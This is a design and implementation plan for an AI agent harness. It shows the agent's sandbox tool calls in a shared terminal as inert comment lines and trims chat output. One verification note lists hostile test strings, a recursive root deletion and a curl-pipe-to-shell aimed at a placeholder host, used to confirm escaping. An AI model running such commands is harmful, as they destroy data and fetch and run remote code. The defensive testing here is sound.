# hack-house → Native harness: visible injection + structured output — Plan

> **Status:** Implemented (§2 display-mirror hybrid) · **Date:** 2026-06-09
> **Scope:** Make the `native` `!task` harness (a) visibly act in the shared
> sandbox terminal again (like the old `simple` injector did), and (b) stop
> flooding chat with unstructured per-step lines.
> **Builds on:** `docs/spec-native-harness.md` (Phase 3 follow-up).
> **Touch:** `cmd_chat/agent/bridge.py` (mainly), maybe `hh/src/app.rs`/`ui.rs`
> for the purist option only.

---

## 0. Problem (diagnosed 2026-06-09)

Two regressions vs. the old `simple` harness, both rooted in one architectural
choice in `_run_native`.

### 0.1 Native execution is invisible in the sandbox terminal pane

- The **terminal pane everyone watches is fed ONLY by `_sbx:data` frames**, which
  the broker emits from the **shared PTY** (`hh/src/app.rs:1530-1534`; the broker
  renders its own PTY locally, others paint from `_sbx:data`).
- The old **`simple`** harness typed commands **into that shared PTY** via
  `_sbx:input` (`bridge.py:_inject` ~421-429 → broker writes them at
  `app.rs:1458-1463`). You literally saw it type and the output scroll.
- The new **`native`** harness runs each tool call as a **separate host
  subprocess** — `<engine> exec -i <name> sh -c …` (`bridge.py:_exec_capture`
  ~498-519), deliberately, so it can **capture** stdout to feed the model. The
  side effect: that output **never enters the shared PTY**, so it never becomes
  `_sbx:data`, so the terminal pane stays blank. The commands *do* run (files get
  created in the container) — you just can't see anything happen.
- The bridge also currently **drops all `_sbx:data` frames**
  (`bridge.py:_handle_frame` ~857-859 → `_handle_control` ignores them), so today
  it can't read the shared shell at all.

### 0.2 Native floods chat with unstructured lines

`_run_native` (`bridge.py` ~574-640) posts a **separate room broadcast per step**:
- header `† {name}: working on — {task}` (~598)
- one line **per tool call** `† {name} ▸ {describe_call}` (~632)
- final `† {name} (native) for {asker}: …` (~639)

With turn cap ≤5 × multiple calls that's a wall of interleaved `† … ▸ $ cmd`
lines, no structure, results not even shown — just the calls.

---

## 1. Goal

1. **Restore visible injection** — the granted agent's actions show up in the
   shared sandbox terminal again, for the whole clergy.
2. **Structure the "thinking"** — move the step-by-step play-by-play out of chat
   into a clean, readable transcript; chat keeps only a concise final summary.
3. **Keep** native's ability to read command output (its reason to exist) and all
   existing guards (DESTRUCTIVE gate, `MAX_COMMANDS`, `NATIVE_OUTPUT_CAP`,
   `NATIVE_TOOL_TIMEOUT`, turn cap, owner ACL gate, sandbox = blast radius).

---

## 2. Recommended approach — "display-mirror hybrid" (low risk)

Keep the out-of-band `<engine> exec` for **capture** (unchanged), but **mirror**
every step into the shared PTY as **display-only** writes so the clergy sees it,
and **collapse chat** to one final line.

### 2.1 Mirror into the terminal (Fix 1, light)

For each tool call in `_run_native` (`bridge.py` ~623-633):

1. **Before** running: write a non-executing prompt/echo line into the shared PTY
   via `_send_sbx_input` (`bridge.py` ~394-399), e.g.
   `# † {name} ▸ $ <cmd>\n` — a **shell comment** so the PTY's shell does NOT
   execute it (no double-run). For `write_file`/`read_file` use
   `# † {name} ▸ write <path>` / `… read <path>`.
2. **Run** the real command out-of-band via `_exec_tool` (unchanged) → captured
   output for the model.
3. **After** running: echo a capped, commented summary of the result back into the
   PTY (e.g. first N lines prefixed `# `, then `# † exit={rc}`), so the terminal
   reads as a coherent transcript of what the agent did.

Notes / gotchas:
- `_send_sbx_input` is **inert unless granted** (broker keys off sender) — same
  gate as `simple`. Native only runs when `self.granted`, so this is fine.
- Comment-prefix (`# `) is the safety trick: anything written to PTY stdin is run
  by the shell, so the mirror MUST be inert. Prefix every mirrored line with `# `
  and strip/curtail embedded newlines so a multi-line result can't break out of
  the comment. Cap mirrored output (reuse a small cap, e.g. 10–20 lines).
- Throttle writes (`asyncio.sleep(~0.05-0.1)`) like `_inject` does so the relayed
  `_sbx:data` stays legible.
- Decide: mirror full (capped) result, or just a one-line `† exit={rc}` per step.
  Recommend **capped result** for `run_shell`/`read_file`, one-line for
  `write_file`.

### 2.2 De-flood chat (Fix 2)

- **Remove** the per-call `_send_chat` at ~632 and the header at ~598 (the
  play-by-play now lives in the terminal transcript from 2.1).
- **Keep** only the single final summary (~639), trimmed. Optionally also keep one
  short opener if a fully-silent start feels off — but prefer terminal-only for
  the steps.
- Leave `_send_typing` (spinner) as-is; it's a control frame, not chat.

### 2.3 Acceptance

- A granted `/ai <name> !<task>` shows each command + (capped) result in the
  **sandbox terminal pane** for all members, with no double execution.
- Chat gets **one** final line (plus optional opener), not N step lines.
- Output capture still drives the loop (model self-corrects across turns).
- Destructive `run_shell` still blocked; caps/timeouts unchanged.
- `simple` harness + `/ai confirm` path unchanged.

---

## 3. Alternative — "PTY sentinel capture" (purist, higher risk)

Run `run_shell` **through the shared PTY** for real (true shared execution +
visible output) and capture by wrapping with sentinels:
`echo __HH_START_<id>__; <cmd>; echo __HH_END_<id>_$?__`, then have the bridge
**subscribe to `_sbx:data`** (stop dropping it in `_handle_control`), accumulate,
strip ANSI, and demux the slice between sentinels to feed back to the model.

- **Pro:** one unified shared shell — the agent reads exactly what humans see; no
  out-of-band exec at all.
- **Con:** async stream parsing, per-call timeouts on a stream (not a process),
  ANSI/terminal-control stripping, and **contention** with a human who is also
  driving (F2). Much more to get right. `write_file` via heredoc-over-PTY is
  fiddly vs. the current clean stdin pipe.

**Recommendation:** ship §2 first (restores the felt behavior with little risk);
consider §3 only if we later want the agent to truly share one shell with humans.

---

## 4. Work breakdown (for the new session)

1. `bridge.py`: add a `_mirror_to_pty(ws, line)` helper (comment-prefix + newline
   strip + throttle) wrapping `_send_sbx_input`.
2. `bridge.py`: in `_run_native`'s call loop (~623-633), mirror **before** (the
   command) and **after** (capped result) each `_exec_tool`.
3. `bridge.py`: drop the header (~598) and per-call chat line (~632); keep/trim the
   final (~639).
4. Manual live test via tmux (see memory: *Driving the hh TUI via tmux*) — grant
   the agent, run a `!task`, confirm terminal shows the transcript and chat shows
   one line. Watch for double execution and comment-escape.
5. `py_compile` + a fake-provider unit pass if one exists for the native loop.
6. Update `docs/spec-native-harness.md` Phase 3 notes + memory
   (`hh_podman_goose_integration.md`) once landed.

## 4a. What shipped (2026-06-09)

§2 implemented in `cmd_chat/agent/bridge.py`:
- New `_mirror_to_pty(ws, text, *, cap)` helper — splits on newlines, prefixes
  **every** line with `# ` (inert comment, never executed), strips `\r`, caps to
  `MIRROR_MAX_LINES=12` with a `… (+N more)` notice, throttles 0.05s/line. Inert
  until granted (broker keys writes off the sender).
- `_run_native` mirrors **only the agent's actions** into the shared PTY: one
  `▸ {describe_call}` comment per tool call (e.g. `# ▸ $ ls`, `# ▸ write ./x.sh`),
  so the clergy sees what it does in the sandbox. After iterating with the user we
  **dropped** the start/done banners, the interim-reasoning mirror, and the
  per-step result mirror from the terminal — those read as chat content, not
  terminal content, and the result lines (esp. errors) were noise. Outcomes are
  reported via the single final chat summary. Real execution still runs
  out-of-band via `_exec_tool` (capture feeds the model loop, intact).
- `write_file` now `mkdir -p "$(dirname "$1")"` before `cat > "$1"` so a path into
  a not-yet-existing directory works — fixes the regression where the model picked
  an absolute path (`/var/lib/.../`), every write failed `exit=2 Directory
  nonexistent`, and no scripts were ever created (the old simple harness avoided
  this by typing relative-path heredocs into the shell's CWD). `NATIVE_SYSTEM` also
  now steers the model to relative paths under the sandbox home + to run scripts to
  verify.
- Chat de-flooded: the per-call `† … ▸` broadcasts are gone; chat now carries just
  the one opener (`† {name}: working on — {task}`) + the one final summary.
- Resolved open Qs: **(1)** mirror the capped result for every step (write_file's is
  already a one-liner); **(2)** keep a single chat opener, steps are terminal-only;
  **(3)** reuse `NATIVE_OUTPUT_CAP` for the model feed, separate `MIRROR_MAX_LINES`
  line-cap for the pane so the terminal stays legible.
- Verified offline (fake provider): exactly 2 chat lines, transcript mirrored as
  inert comments, no double execution; hostile multi-line results (`rm -rf /`,
  `$(curl evil|sh)`, embedded CR) all neutralized as single `# ` comment lines.
**Chat readability (follow-on, same day):**
- `hh/src/ui.rs` `fmt_line` now returns `Vec<Line>` and splits records on `\n`, so
  a multi-line agent answer/plan renders as an indented block instead of one
  garbled ratatui row; `draw_chat` `flat_map`s it. AI output (leading `†`) +
  client system notices render as dim/italic sigil-marked "action" blocks
  attributed to the author.
- `bridge.py` `_run_native` chat lines de-duplicated: opener `† working — {task}`,
  final `† @{asker} {final}` (the client now supplies the name/sigil styling, so
  the bot no longer repeats `{name}: … (native) for …`).

- Not done (deferred): §3 PTY-sentinel purist path; live tmux validation vs Ollama.

## 5. Open questions

1. Mirror **full capped result** into the terminal, or just `exit={rc}` per step?
   (Leaning: capped result for run_shell/read_file, one-liner for write_file.)
2. Keep a single chat **opener** line, or go fully terminal-only for steps with
   just the final summary in chat?
3. Mirror cap size (lines/bytes) — reuse `NATIVE_OUTPUT_CAP` (4096B) or a smaller
   per-pane cap so the terminal stays legible?
